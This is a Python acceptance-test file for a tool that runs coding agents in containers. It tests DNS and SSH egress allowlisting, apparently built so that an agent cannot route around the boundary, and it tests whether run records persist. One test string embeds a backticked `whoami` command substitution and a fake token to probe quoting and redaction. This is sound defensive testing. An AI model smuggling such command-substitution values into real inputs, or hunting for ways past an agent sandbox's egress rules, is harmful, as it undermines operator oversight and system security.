    """SC-013, quickstart S15 — `dig @8.8.8.8`, with the tools the image has.

    FR-020a is met by DROPPING port 53 rather than redirecting it (research R18):
    every resolver except ours is unreachable, so there is nothing left to
    redirect. The assertion is written against the PROPERTY rather than that
    mechanism — an implementation that redirected instead would still have to
    keep the question inside the boundary, and that is what is checked.

    `example.com` is the query on purpose. It resolves publicly, so rcode 0 is
    unambiguous proof the question reached Google; a name that exists nowhere
    would come back NXDOMAIN from either resolver and prove nothing either way.
    """
    laptop = _gen_keypair(acc.tmp / "lapB7")
    proj = _phase_b_project(acc, "accb7")
    acc.register("accb7")
    assert acc.cli(
        ["up", "accb7", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
    ).returncode == 0  # fmt: skip

    direct = _dns_probe("accb7", "example.com", server="8.8.8.8")
    assert direct.startswith("NORESPONSE") or direct.startswith("RCODE 5"), (
        f"a query addressed to 8.8.8.8 was answered ({direct!r}) — rcode 0 means "
        f"it reached Google, and every DNS guarantee in this feature is then "
        f"advisory: an agent picks its own resolver and the allowlist is bypassed"
    )

    # The complement, and it is not optional: without it a container with no
    # network at all passes the assertion above.
    ours = _dns_probe("accb7", "api.anthropic.com")
    assert ours.startswith("RCODE 0"), (
        f"the sidecar resolver did not answer a DECLARED name ({ours!r}) — the "
        f"refusal above would then be indistinguishable from dead DNS"
    )


# Opt-in, on the same principle as the Hetzner test: the end-to-end push needs a
# real repository and a real key, which this module deliberately does not have
# (see the module docstring). Set both to run it.
_PUSH_URL = os.environ.get("AGENT_CONTAINER_ACCEPTANCE_PUSH_URL")  # git@host:owner/repo.git
# Since Feature 019 the tool cannot be handed a private key, so this key is installed
# the way an operator with container access would — copied straight onto the ssh
# volume, over the one the container generated. That is deliberately OUTSIDE the tool:
# the test needs a key the forge already trusts, and a freshly generated one is by
# definition registered nowhere.
_PUSH_KEY = os.environ.get("AGENT_CONTAINER_ACCEPTANCE_PUSH_KEY")  # private key path


def _install_pre_registered_key(name: str, key_path: str) -> None:
    """Overwrite the container's generated key with one the forge already trusts.

    Not a back door the tool offers — the tool has no such path any more, which is
    the feature. This is the harness standing in for an operator with direct access
    to the container, so the egress arm can push to a REAL remote without waiting on
    a human to register a key that only exists once this test has already run.
    """
    c = f"agent-container-{name}"
    subprocess.run([RUNTIME, "cp", key_path, f"{c}:/home/dev/.ssh/id_ed25519"], check=False)
    subprocess.run(
        [RUNTIME, "exec", "-u", "root", c, "chown", "dev:dev", "/home/dev/.ssh/id_ed25519"],
        check=False,
    )
    subprocess.run([RUNTIME, "exec", c, "chmod", "600", "/home/dev/.ssh/id_ed25519"], check=False)


def test_git_push_over_declared_ssh_reaches_the_remote(acc):
    """Quickstart S18 / T138 — if this fails the feature is unshippable.

    Default-deny kills `git push` over SSH unless port 22 is declared: Hard
    Constraint #1 (every agent commits AND pushes) breaking from the opposite
    direction to Phase A's HTTPS case.

    TWO ARMS, and the split is stated rather than hidden. The always-on arm
    drives the same SSH transport git uses and asserts the REMOTE ANSWERED: the
    server completes the handshake and then refuses the absent key, which is a
    protocol-level rejection and therefore proof the boundary carried the
    session. **It does not prove a push completes** — only that the one thing
    default-deny can break is not broken. The push itself is the second arm.

    Reading a refusal as success is safe here and only here: 'Permission denied'
    can be produced ONLY by a server that received the authentication request,
    whereas everything default-deny does (drop, timeout, unreachable) fails
    before any server is spoken to.

    WHAT THIS TEST STRUCTURALLY CANNOT SEE, stated because the task it closes is
    the one declared "unshippable if it fails" (T147, research R24/R25). It probes
    SECONDS after `up`, and `{host, port}` is enforced by `iptables -d <name>`,
    which resolves the operand ONCE at rule-install time and pins the addresses in
    that single answer — nothing in the boundary re-resolves (measured at T146: the
    egress container runs exactly `squid` and `unbound`, no refresher). So a green
    result here means "reachable at deploy", not "reachable for the life of the
    container". Measured at T146 on a live boundary: `github.com` pinned to
    140.82.121.4, and 140.82.121.3 / .5 — the SAME host's other rotation addresses
    — both time out. The moment the resolver hands the agent one of those, this
    transport is dead until the container restarts, and R24 caught exactly that at
    301 s with no recovery. A time-boxed probe cannot distinguish the two, which is
    why the limitation is written here rather than left to be rediscovered as a
    passing test over a broken push.
    """
    endpoint = ("github.com", 22)
    if _PUSH_URL:
        # Parsed with the CLI's OWN parser, not a second one: if the two ever
        # disagreed, the deploy-time SSH check (FR-003c) would be vouching for an
        # endpoint the push never uses — a check that passes for the wrong thing.
        endpoint = _load_cli().ssh_remote_endpoint(_PUSH_URL)
        assert endpoint, f"AGENT_CONTAINER_ACCEPTANCE_PUSH_URL is not an SSH remote: {_PUSH_URL}"
    host, port = endpoint

    laptop = _gen_keypair(acc.tmp / "lapB8")
    proj = _phase_b_project(acc, "accb8", f"        - host: {host}\n          port: {port}\n")
    acc.register("accb8")
    argv = ["up", "accb8", "--authorized-key", str(laptop.with_suffix(".pub"))]
    r = acc.cli(argv, cwd=proj)
    assert r.returncode == 0, f"deploy with a declared SSH endpoint failed:\n{r.stderr}"
    if _PUSH_KEY:
        _install_pre_registered_key("accb8", _PUSH_KEY)

    handshake = _exec("accb8", ["ssh", "-T", "-p", str(port),
                                "-o", "BatchMode=yes",
                                "-o", "StrictHostKeyChecking=no",
                                "-o", "UserKnownHostsFile=/dev/null",
                                "-o", "ConnectTimeout=15", f"git@{host}"])  # fmt: skip
    answered = handshake.stderr + handshake.stdout
    assert "Permission denied" in answered or "successfully authenticated" in answered, (
        f"the DECLARED SSH remote never answered: {answered.strip()[:300]!r}. A "
        f"timeout, 'Network is unreachable' or 'Could not resolve hostname' here "
        f"means default-deny is eating `git push`, and Hard Constraint #1 with it"
    )

    if not (_PUSH_URL and _PUSH_KEY):
        return  # transport proven; the push needs a repo this module has no key for
    # The URL rides as "$1" rather than being interpolated: an operator-supplied
    # value spliced into a shell string is a quoting bug waiting for a repo name
    # with a shell metacharacter in it.
    push = _exec("accb8", ["sh", "-c",
        'set -e; d=$(mktemp -d); git clone "$1" "$d"; cd "$d"; '
        "date -u +'T138 %Y-%m-%dT%H:%M:%SZ' >> .agent-container-heartbeat; "
        "git add .agent-container-heartbeat; "
        "git commit -m 'test(T138): egress acceptance heartbeat'; "
        "git push origin HEAD", "sh", _PUSH_URL])  # fmt: skip
    assert push.returncode == 0, (
        f"`git push` over the declared SSH endpoint failed — the feature is "
        f"unshippable in this state:\n{push.stdout[-2000:]}\n{push.stderr[-2000:]}"
    )


def test_an_undeclared_environment_keeps_its_own_network(acc):
    """FR-004, quickstart S19 — default-deny applies to environments that opted
    in, NEVER retroactively. An upgrade that air-gaps everyone who never asked
    for egress control is the worst regression this feature can ship, and it is
    invisible to every other test here: they all declare something.

    `test_no_declaration_deploys_exactly_as_before` asserts the generated MODEL
    has no egress service. This asserts the RUNNING environment behaves like one
    that was never touched, which the model does not imply — the port owner, the
    network namespace and the resolver in the path are all runtime facts.
    """
    laptop = _gen_keypair(acc.tmp / "lapB9")
    proj = _egress_project(acc, "accb9", "")  # no `egress:` key at all
    acc.register("accb9")
    r = acc.cli(["up", "accb9", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj)
    assert r.returncode == 0, f"an undeclared environment must deploy unchanged:\n{r.stderr}"

    ps = subprocess.run(
        [RUNTIME, "ps", "-a", "--format", "{{.Names}}"], capture_output=True, text=True
    )
    assert "agent-egress-accb9" not in ps.stdout, "an undeclared environment grew a boundary"

    def inspect(fmt: str) -> str:
        return subprocess.run(
            [RUNTIME, "inspect", "agent-container-accb9", "--format", fmt],
            capture_output=True, text=True,
        ).stdout.strip()  # fmt: skip

    # The two halves of "no rules": the agent is in its OWN namespace (so there is
    # nowhere for a NET_ADMIN sidecar's rules to reach it from), and it still owns
    # its published port — the T118 migration must not run for an environment that
    # never declared anything.
    netmode = inspect("{{.HostConfig.NetworkMode}}")
    assert not netmode.startswith("container:"), (
        f"the agent joined another container's namespace ({netmode!r}) with no declaration"
    )
    assert "2222" in inspect("{{.HostConfig.PortBindings}}"), (
        "the published port moved off the agent, so the port-owner migration ran "
        "for an environment that never opted in"
    )

    # `; true` so the exit code reports nothing: `printenv` fails on the first
    # unset name, and here EVERY name being unset is the passing case.
    proxy = _exec("accb9", ["sh", "-c", "printenv HTTPS_PROXY https_proxy NO_PROXY no_proxy; true"])
    assert not proxy.stdout.strip(), f"proxy variables were injected anyway: {proxy.stdout!r}"

    # No forced resolver, checked twice. An undeclared name resolving rules out an
    # allowlist, and the rcode rules out ours being in the path at all: REFUSED is
    # a POLICY rcode that only unbound produces here — an ordinary resolver answers
    # NOERROR or NXDOMAIN, never that (research R16/R19a).
    assert _exec("accb9", ["getent", "hosts", "api.openai.com"]).returncode == 0, (
        "an undeclared name did not resolve — an allowlist resolver was applied "
        "to an environment that declared nothing"
    )
    probe = _dns_probe("accb9", "t139-undeclared.example.com")
    assert not probe.startswith("RCODE 5"), (
        f"the resolver answered REFUSED ({probe!r}) — REFUSED is a POLICY answer, "
        f"so the allowlist resolver is in the path of an undeclared environment"
    )

    # And unrestricted, not merely un-proxied: a host no declaration anywhere in
    # this feature permits is reachable.
    reach = _exec("accb9", ["curl", "-s", "-o", "/dev/null", "--max-time", "25",
                            "https://api.openai.com/v1/models"])  # fmt: skip
    assert reach.returncode == 0, (
        f"egress was restricted without a declaration (curl exit {reach.returncode})"
    )


# --- T138 / quickstart S18: a REAL git push over a declared SSH endpoint ------

_GIT_SERVER_DOCKERFILE = """FROM alpine:3.21
RUN apk add --no-cache openssh-server git \
 && ssh-keygen -A \
 && adduser -D -s /bin/sh git \\
 && passwd -u git 2>/dev/null || true
COPY authorized_keys /home/git/.ssh/authorized_keys
RUN chown -R git:git /home/git/.ssh && chmod 700 /home/git/.ssh \
 && chmod 600 /home/git/.ssh/authorized_keys \
 && mkdir -p /srv/repo.git && git init --bare -b main /srv/repo.git \
 && chown -R git:git /srv/repo.git
EXPOSE 22
CMD ["/usr/sbin/sshd","-D","-e"]
"""
# `passwd -u` is load-bearing, not tidying: `adduser -D` leaves the account LOCKED,
# and sshd refuses PUBLIC-KEY auth for a locked account. Without it the push fails
# with `Permission denied (publickey)` — which reads exactly like a boundary refusal
# while the boundary is in fact working, since the connection reached the server to
# be refused at all.

_PUSH_SCRIPT = """
export GIT_SSH_COMMAND="ssh -i ~/.ssh/id_push -o IdentitiesOnly=yes -o IdentityAgent=none \
 -o StrictHostKeyChecking=no -o ConnectTimeout=10"
D=$(mktemp -d); cd "$D"
git init -q -b main .
git config user.email t@example.com; git config user.name T
date > file.txt
git add file.txt; git commit -qm "{msg}"
git remote add origin ssh://git@{host}:22/srv/repo.git
git push origin main 2>&1 | tail -6; echo "exit=${{PIPESTATUS[0]}}"
"""


def test_git_push_over_a_declared_ssh_endpoint_actually_pushes(acc):
    """T138, quickstart S18 — the assertion the feature calls unshippable if it fails.

    HERMETIC ON PURPOSE. The obvious version pushes to github.com, which needs a
    write credential and touches real infrastructure; it also cannot express the
    NEGATIVE case, because there is no second GitHub to leave undeclared. So the
    destination is a throwaway SSH git server on the compose network: the declared
    one must accept a real push, and an identical UNDECLARED one must not. Without
    that control the test proves only that something worked — a boundary permitting
    everything passes the positive arm.

    The transport arm (`ssh -T`) was already covered and is not what this adds. What
    was never exercised is a COMPLETE push — several round trips and a pack upload —
    over a connection the packet filter had to permit.
    """
    laptop = _gen_keypair(acc.tmp / "lapS18")
    push = _gen_keypair(acc.tmp / "pushkey")
    names = ("acc-s18-declared", "acc-s18-undeclared")

    def drop_servers():
        """Stop THEN remove, on every exit path.

        The first version removed without stopping and only cleaned up after the
        final assertion, so one failure left both servers running and every later
        run died at `docker run` with a name clash — a broken test reporting the
        wrong reason from the second attempt onward.
        """
        for n in names:
            subprocess.run([RUNTIME, "stop", n], capture_output=True)
            subprocess.run([RUNTIME, "rm", "-v", n], capture_output=True)

    srv_ctx = acc.tmp / "gitsrv"
    srv_ctx.mkdir(parents=True, exist_ok=True)
    (srv_ctx / "Dockerfile").write_text(_GIT_SERVER_DOCKERFILE)
    (srv_ctx / "authorized_keys").write_text(push.with_suffix(".pub").read_text())
    assert (
        subprocess.run(
            [RUNTIME, "build", "-q", "-t", "acc-gitsrv:test", str(srv_ctx)],
            capture_output=True,
            text=True,
        ).returncode
        == 0
    ), "could not build the throwaway git server"

    drop_servers()
    try:
        for n in names:
            assert (
                subprocess.run(
                    [RUNTIME, "run", "-d", "--name", n, "acc-gitsrv:test"], capture_output=True
                ).returncode
                == 0
            )
        time.sleep(4)

        proj = _phase_b_project(acc, "accs18")
        acc.register("accs18")
        # The first deploy CREATES the compose network. Only then can the servers
        # join it and have an address, and the declaration names an address — so it
        # cannot be written before the network exists.
        assert (
            acc.cli(
                ["up", "accs18", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
            ).returncode
            == 0
        )
        net = subprocess.run(
            [
                RUNTIME,
                "inspect",
                "agent-egress-accs18",
                "--format",
                "{{range $k,$v := .NetworkSettings.Networks}}{{$k}}{{end}}",
            ],
            capture_output=True,
            text=True,
        ).stdout.strip()
        ips = {}
        for n in names:
            subprocess.run([RUNTIME, "network", "connect", net, n], capture_output=True)
            ips[n] = subprocess.run(
                [
                    RUNTIME,
                    "inspect",
                    n,
                    "--format",
                    # Concatenated, not %-formatted or f-string: the Go template is
                    # all braces, so both alternatives would fight the syntax.
                    '{{(index .NetworkSettings.Networks "' + net + '").IPAddress}}',
                ],
                capture_output=True,
                text=True,
            ).stdout.strip()
            assert ips[n], f"no address for {n} on {net}"

        spec = proj / ".agent-container" / "environments.yaml"
        spec.write_text(
            spec.read_text().replace(
                "      allow:\n        - provider: anthropic\n",
                f"      allow:\n        - provider: anthropic\n"
                f"        - {{host: {ips[names[0]]}, port: 22}}\n",
            )
        )
        assert acc.cli(["redeploy", "accs18"], cwd=proj).returncode == 0

        agent = "agent-container-accs18"
        subprocess.run([RUNTIME, "exec", agent, "sh", "-c", "mkdir -p ~/.ssh; chmod 700 ~/.ssh"])
        subprocess.run([RUNTIME, "cp", str(push), f"{agent}:/home/dev/.ssh/id_push"])
        subprocess.run(
            [RUNTIME, "exec", "-u", "root", agent, "chown", "dev:dev", "/home/dev/.ssh/id_push"]
        )
        subprocess.run([RUNTIME, "exec", agent, "chmod", "600", "/home/dev/.ssh/id_push"])

        declared = _exec(
            "accs18",
            ["bash", "-lc", _PUSH_SCRIPT.format(host=ips[names[0]], msg="s18 declared")],
        )
        assert "exit=0" in declared.stdout, (
            "a real push to a DECLARED ssh endpoint failed — S18 says the feature is "
            f"unshippable if this fails:\n{declared.stdout}\n{declared.stderr}"
        )
        received = subprocess.run(
            [RUNTIME, "exec", names[0], "git", "--git-dir=/srv/repo.git", "log", "--oneline", "-1"],
            capture_output=True,
            text=True,
        ).stdout
        assert "s18 declared" in received, (
            f"the push reported success but the server has nothing: {received!r}"
        )

        undeclared = _exec(
            "accs18",
            ["bash", "-lc", _PUSH_SCRIPT.format(host=ips[names[1]], msg="s18 undeclared")],
        )
        assert "exit=0" not in undeclared.stdout, (
            "an UNDECLARED ssh endpoint accepted a push — without this arm the "
            f"assertion above proves only that something worked:\n{undeclared.stdout}"
        )
    finally:
        drop_servers()


# --- Feature 016: a run leaves a record that outlives its container ----------
# T023/T024/T025 (quickstart S2/S3/S4). The container writes the record to a
# volume; the CLI ingests it on next contact. These are the acceptance tests the
# rest of the feature is gated on — if a record does not survive `down --purge`,
# nothing built on top of it matters.

# The agents ship with no credentials in this suite, so a real one exits within a
# second — which is fine for "did a record appear" and useless for "was it still
# running when SIGKILL landed". A stand-in binary on the workspace bind gives the
# RUN a controllable lifetime without touching any part of the mechanism under
# test: the entrypoint still opens the record, supervises the child, traps the
# signal and completes the record exactly as it does for a real agent.
_FAKE_AGENT_PATH = "PATH=/workspace:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"


def _fake_agent(acc, name: str, body: str) -> Path:
    """A directory holding an executable `claude` that runs `body` — mounted as the
    workspace, or (T032) mounted elsewhere and put on PATH when the workspace has
    to stay empty."""
    d = acc.tmp / f"fakeagent-{name}"
    d.mkdir(parents=True, exist_ok=True)
    exe = d / "claude"
    exe.write_text(f"#!/bin/sh\n# acceptance stand-in for the agent binary\n{body}\n")
    exe.chmod(0o755)
    return d


def _runs_payload(acc, name: str) -> dict:
    """The WHOLE `runs list <name> --json` payload, unwrapped from the Feature 009
    envelope: the verbatim records plus the derived keys (`unpushed`, `usage`).

    The derived keys are the machine-readable half of the alarms (T030, C8) — an
    agent that had to re-derive commit-without-push from each record is an agent
    that can forget to — so a test that only ever read `runs` would leave the two
    halves free to disagree, which is SC-003's failure exactly."""
    r = acc.cli(["runs", "list", name, "--json"])
    assert r.returncode == 0, f"runs list {name} failed:\n{r.stdout}\n{r.stderr}"
    return json.loads(r.stdout)["data"]


def _runs(acc, name: str) -> list[dict]:
    """`runs list <name> --json`, unwrapped from the Feature 009 envelope."""
    return _runs_payload(acc, name)["runs"]


_ANSI = re.compile(r"\x1b\[[0-9;]*m")


def _plain(text: str) -> str:
    """Human output with rich's styling removed, for assertions about the WORDS.

    MEASURED, not precautionary: with FORCE_COLOR set (this developer's shell sets
    it, and CI runners may) rich styles a captured pipe exactly as it styles a
    terminal, and its highlighter puts escape sequences around the number and the
    parentheses of `2 run(s)` — which reads correctly on screen and is not a
    substring of what the test captured. Failing there would report the terminal
    rather than the tool; avoiding it by only ever asserting on words that styling
    cannot split would report less than the test claims to check."""
    return _ANSI.sub("", text)


def _wait_container(name: str, predicate, timeout: int = 60) -> str:
    """Poll the container's status with the RUNTIME directly, never through the
    CLI: T024's whole property is that the CLI is not in contact while the run
    ends, so a harness that polled with `agent-container status` would be the
    contact it claims is absent."""
    cname = f"agent-container-{name}"
    deadline = time.monotonic() + timeout
    status = ""
    while time.monotonic() < deadline:
        status = subprocess.run(
            [RUNTIME, "ps", "-a", "--filter", f"name={cname}", "--format", "{{.Status}}"],
            capture_output=True,
            text=True,
        ).stdout.strip()
        if predicate(status):
            return status
        time.sleep(1)
    raise AssertionError(f"{cname} never reached the expected state (last status: {status!r})")


def _wait_run_started(name: str, needle: str, timeout: int = 60) -> None:
    """Block until the RUN is under way — the workload process the entrypoint
    supervises is alive inside the container.

    `Up` IS NOT THAT, and the difference is the whole reason this helper exists.
    The runtime marks a container `Up` the instant its process is created, which
    is before the entrypoint has executed a line: measured on an idle Linux host,
    the pending record lands 0.27-0.57s after `Up` first reads true, of which
    0.08-0.35s is bash starting up and reading a 1300-line script. A `docker kill`
    fired straight off that status arrived inside the window 8 times out of 8. So
    a test that killed on `Up` alone would be demanding a record for a run that
    had not started — something no entrypoint can produce, because the runtime
    published `Up` before it got to run — and it would be demanding it flakily,
    passing on macOS+Lima only because the daemon round trips there are slower
    than the container's own startup. That is the failure this replaces.

    The wait is on the container's own process table, never on the entrypoint's log
    and never through the CLI: waiting for 'run record ... opened' would wait for
    the very thing the caller then asserts, and the assertion would hold by
    construction. The stand-in agent's command line names an independent fact, and
    the entrypoint opens the record BEFORE it launches the agent, so once this
    returns, a missing record is a defect and the caller still fails.

    READ FROM /proc INSIDE THE CONTAINER, NOT FROM `<runtime> top`, and that is the
    whole reason this is not a one-liner. `docker top` runs `ps -ef` on the daemon
    host, whose CMD column carries the full command line, so a needle containing an
    ARGUMENT ('sleep 600') matches. `podman top`'s default COMMAND column is
    documented as the process's `comm` — its own manual's example prints `sh`,
    `sleep`, `vi` with no arguments, and `args` is a descriptor an operator has to
    ask for. The two runtimes do not even take the same kind of argument for it
    (`docker top` forwards ps options, `podman top` takes psgo descriptors), so
    there is no one invocation that means the same thing to both. ADR 0001 decided
    on podman and `_detect_runtime` selects it on any host without docker, so
    binding these tests to docker's default output format would leave them
    unrunnable there — silently, by never matching. `/proc/<pid>/cmdline` is the
    kernel's own answer, identical under both.
    """
    cname = f"agent-container-{name}"
    # NUL-separated, so `tr` is what makes a needle with a space in it findable.
    # Failures are swallowed per file: a process that exits between the glob and the
    # read is normal and must not abort the sweep.
    script = 'for f in /proc/[0-9]*/cmdline; do tr "\\0" " " < "$f" 2>/dev/null; echo; done'
    deadline = time.monotonic() + timeout
    last = ""
    while time.monotonic() < deadline:
        ps = subprocess.run(
            [RUNTIME, "exec", cname, "sh", "-c", script], capture_output=True, text=True
        )
        last = ps.stdout or ps.stderr
        if ps.returncode == 0 and needle in ps.stdout:
            return
        time.sleep(0.2)
    raise AssertionError(
        f"{cname} never started its workload ({needle!r} never appeared in the "
        f"container's own /proc); the run never began, so nothing about how it ENDS "
        f"can be tested here. Last output:\n{last}"
    )


def test_a_record_survives_purge(acc):
    """T023 / quickstart S2 (C3, FR-001, SC-001) — THE feature. A headless run's
    record must still be retrievable after the container and all ten of its
    volumes, the record's own volume included, are destroyed."""
    ws = _fake_agent(acc, "purge", "exit 0")
    acc.up(
        "acc16srv",
        mode="headless",
        agent="claude",
        task="leave a record",
        workspace="bind",
        workspace_dir=ws,
        env_extra=[_FAKE_AGENT_PATH],
        foreground=True,
        wait=False,
    )
    before = _runs(acc, "acc16srv")
    assert len(before) == 1, f"the run left no single record to test with: {before}"
    assert before[0]["outcome"] == "finished" and before[0]["exit_code"] == 0
    assert before[0]["environment"] == "acc16srv"  # stamped at ingestion
    assert before[0]["task"] == "leave a record"

    acc.down("acc16srv", purge=True)
    assert acc.volumes_of("acc16srv") == [], "purge left volumes behind; the test proves nothing"

    after = _runs(acc, "acc16srv")
    assert [r["run_id"] for r in after] == [before[0]["run_id"]], (
        "the record did not survive `down --purge` — this is the feature, and "
        f"nothing built on it matters until it does: {after}"
    )


def test_a_detached_run_is_ingested_on_next_contact(acc):
    """T024 / quickstart S3 (SC-002a). Detached is the DEFAULT headless mode, so a
    design that only recorded foreground runs would miss the common case. The CLI
    returns at `up` and is not attached when the agent finishes; the record must
    appear on the next command that touches the host."""
    ws = _fake_agent(acc, "detached", "sleep 20; exit 0")
    r = acc.up(
        "acc16det",
        mode="headless",
        agent="claude",
        task="detached run",
        workspace="bind",
        workspace_dir=ws,
        env_extra=[_FAKE_AGENT_PATH],
        wait=False,  # no --foreground: `up` returns while the agent is still running
    )
    assert r.returncode == 0, f"detached up failed:\n{r.stderr}"

    # A contact WHILE the run is in flight. The pending record it finds is
    # byte-identical to the one a SIGKILLed run leaves behind, and the only thing
    # separating them is that this writer is still alive — so this asserts the
    # in-flight record is NOT declared `stopped`. Getting this wrong would make
    # every mid-run `runs list` report a live run as killed.
    _wait_run_started("acc16det", "sleep 20")
    inflight = _runs(acc, "acc16det")
    assert len(inflight) == 1 and inflight[0]["outcome"] is None, (
        f"a run still in progress was given an ending: {inflight}"
    )

    # The run ends with nothing of ours connected to it. Exit 0 and `restart:
    # on-failure` together mean the container stays down once it is down, so this
    # is a settled state rather than a moment in a restart loop.
    _wait_container("acc16det", lambda s: s.startswith("Exited"))

    runs = _runs(acc, "acc16det")  # the first contact since the run ended
    assert len(runs) == 1, f"the detached run was not ingested: {runs}"
    # The SAME record, now complete: the mid-run contact must not have consumed
    # the container's copy, or the ending it wrote at exit would have had nowhere
    # to land and the store would keep the pending version forever.
    assert runs[0]["run_id"] == inflight[0]["run_id"]
    assert runs[0]["outcome"] == "finished"
    assert runs[0]["ended_at"], "an ingested record with no ended_at was never completed"


def test_a_killed_run_still_yields_a_record(acc):
    """T025 / quickstart S4 (C5, SC-008). SIGKILL runs no trap, so the ONLY thing
    that can produce a record here is the pending write the entrypoint makes at
    start; ingestion completes it as `stopped`.

    The wrong answer that looks right is NO RECORD AT ALL — an empty listing reads
    like 'nothing to report' rather than 'every abnormal run is being lost', so
    the emptiness is asserted against explicitly.

    The kill lands while the run is PROVABLY in progress (see `_wait_run_started`):
    a record is owed for a run that started, and only for one that started."""
    ws = _fake_agent(acc, "killed", "exec sleep 600")
    r = acc.up(
        "acc16kil",
        mode="headless",
        agent="claude",
        task="sleep 600",
        workspace="bind",
        workspace_dir=ws,
        env_extra=[_FAKE_AGENT_PATH],
        wait=False,
    )
    assert r.returncode == 0, f"up failed:\n{r.stderr}"
    _wait_run_started("acc16kil", "sleep 600")

    kill = subprocess.run(
        [RUNTIME, "kill", "agent-container-acc16kil"], capture_output=True, text=True
    )
    assert kill.returncode == 0, kill.stderr
    _wait_container("acc16kil", lambda s: s.startswith("Exited"))

    runs = _runs(acc, "acc16kil")
    assert runs, (
        "a SIGKILLed run produced NO record. SIGKILL runs no trap, so this means "
        "the start-side pending write is missing and every abnormal run is lost."
    )
    assert len(runs) == 1, f"one kill, one record: {runs}"
    assert runs[0]["outcome"] == "stopped", (
        f"a killed run must be recorded as stopped, not left ambiguous: {runs[0]}"
    )
    # ended_at is deliberately unknown — nobody observed the instant the container
    # went away — and the note says the record was reconstructed so the null reads
    # as 'not known' rather than as a bug in the writer (data-model §7).
    assert runs[0]["ended_at"] is None
    assert any("reconstructed" in n for n in runs[0]["notes"]), runs[0]["notes"]


def test_a_record_survives_purge_of_a_RUNNING_environment(acc):
    """Quickstart S9 (C4, FR-001b) — the teardown ordering, in the shape that
    actually broke. `compose down --volumes` kills the container and drops its
    volume in ONE step, so a drain that merely runs 'before the removal' collects
    the PENDING record written at start and then destroys the `stopped` one the
    SIGTERM trap writes. Measured: that stored a null outcome forever.

    T023 cannot catch this — its run has already exited by teardown time — so
    without this test the teardown ordering is only ever exercised against a
    container that had nothing left to say."""
    ws = _fake_agent(acc, "live", "exec sleep 600")
    r = acc.up(
        "acc16liv",
        mode="headless",
        agent="claude",
        task="still running at teardown",
        workspace="bind",
        workspace_dir=ws,
        env_extra=[_FAKE_AGENT_PATH],
        wait=False,
    )
    assert r.returncode == 0, f"up failed:\n{r.stderr}"
    _wait_run_started("acc16liv", "sleep 600")

    acc.down("acc16liv", purge=True)  # torn down mid-run
    assert acc.volumes_of("acc16liv") == []

    runs = _runs(acc, "acc16liv")
    assert len(runs) == 1, f"tearing down a running environment lost its record: {runs}"
    assert runs[0]["outcome"] == "stopped", (
        f"the run was recorded with an ambiguous ending (SC-002 requires zero): {runs[0]}"
    )
    # The container completed this one itself, inside the stop grace period — so
    # unlike the SIGKILL case the end time IS known, and no reconstruction note.
    assert runs[0]["ended_at"], "the pending record was stored instead of the completed one"
    assert runs[0]["notes"] == []


def test_five_concurrent_environments_each_leave_one_complete_record(acc):
    """T047 / quickstart S10 (C12, FR-009, SC-006). Five environments deployed and
    run AT THE SAME TIME must yield five complete, non-interleaved records.

    One-file-per-record (research R3) is what makes this safe, so the test exists
    to prove that construction was actually USED — a shared append-only file, or a
    read-modify-write of one index, passes every single-run test in this suite and
    loses or splices records only here.

    Each run's task names its own environment, so a spliced record is caught by its
    CONTENT: five records with the right count but the wrong task in one of them is
    exactly the failure a count-only assertion would call a pass.

    The overlap is structural, not timed: each thread blocks in `up --foreground`
    for the whole of its run, so the five containers are writing their records —
    and the five drains are ingesting into one store tree — at the same time.
    Nothing here asserts a wall-clock overlap, because at the one-second resolution
    of `started_at` that assertion would be flaky rather than strict.
    """
    names = [f"acc16n{n}" for n in range(1, 6)]
    workspaces = {n: _fake_agent(acc, n, "exit 0") for n in names}

    def launch(name: str) -> subprocess.CompletedProcess:
        return acc.up(
            name,
            mode="headless",
            agent="claude",
            task=f"concurrent {name}",
            workspace="bind",
            workspace_dir=workspaces[name],
            env_extra=[_FAKE_AGENT_PATH],
            foreground=True,  # each thread returns when ITS run has ended
            wait=False,
        )

    with ThreadPoolExecutor(max_workers=len(names)) as pool:
        results = list(pool.map(launch, names))
    for name, r in zip(names, results, strict=True):
        assert r.returncode == 0, f"concurrent up {name} failed:\n{r.stderr}"

    for name in names:
        runs = _runs(acc, name)
        assert len(runs) == 1, f"{name} produced {len(runs)} record(s), not one: {runs}"
        rec = runs[0]
        assert rec["task"] == f"concurrent {name}", (
            f"{name}'s record carries another run's task — the writes interleaved: {rec}"
        )
        assert rec["environment"] == name
        assert rec["outcome"] == "finished" and rec["exit_code"] == 0, rec
        assert rec["ended_at"], f"{name}'s record was never completed: {rec}"


# The task text is the ONE operator-authored field (C13, research R9) and it is
# recorded VERBATIM — deliberately not redacted, because a pattern-based redactor
# that missed one value would convert the operator's caution into misplaced
# confidence. So this string is built to break both halves of that statement: the
# quoting/escaping it must survive intact (quotes, backslash, `$`, a newline, a
# tab, non-ASCII), and a token-SHAPED substring a redactor would have eaten.
_VERBATIM_TASK = (
    'audit "the config" \\ $HOME `whoami`\n'
    "\tsecond line — ünïcode, 100%\n"
    "ghp_NOTAREALTOKEN000000000000000000000000"
)


def test_the_task_text_round_trips_verbatim(acc):
    """T048 / quickstart S12. What comes back out of the record must be exactly
    what went in: the record is the operator's account of what was asked for, and a
    task that is quietly reshaped between the flag and the store is an account of a
    run that did not happen.

    The token-shaped tail is the redaction probe. FR-010/R9 say the tool does not
    redact; if one is ever added, this fails and the operator learns that the
    documented promise (`recorded verbatim … nothing redacts it`, `up --task`) and
    the behaviour have parted company.
    """
    ws = _fake_agent(acc, "verbatim", "exit 0")
    r = acc.up(
        "acc16tsk",
        mode="headless",
        agent="claude",
        task=_VERBATIM_TASK,
        workspace="bind",
        workspace_dir=ws,
        env_extra=[_FAKE_AGENT_PATH],
        foreground=True,
        wait=False,
    )
    assert r.returncode == 0, f"up failed:\n{r.stderr}"

    runs = _runs(acc, "acc16tsk")
    assert len(runs) == 1, runs
    assert runs[0]["task"] == _VERBATIM_TASK, (
        "the task did not round-trip verbatim.\n"
        f"  sent:  {_VERBATIM_TASK!r}\n  stored: {runs[0]['task']!r}"
    )
    # `runs show --json` is the surface an agent reads (C2, verbatim as stored);
    # asserting only through `runs list` would leave the two free to disagree.
    shown = acc.cli(["runs", "show", runs[0]["run_id"], "--json"])
    assert shown.returncode == 0, shown.stderr
    assert json.loads(shown.stdout)["data"]["task"] == _VERBATIM_TASK


def test_records_are_ingested_over_a_non_default_context(acc):
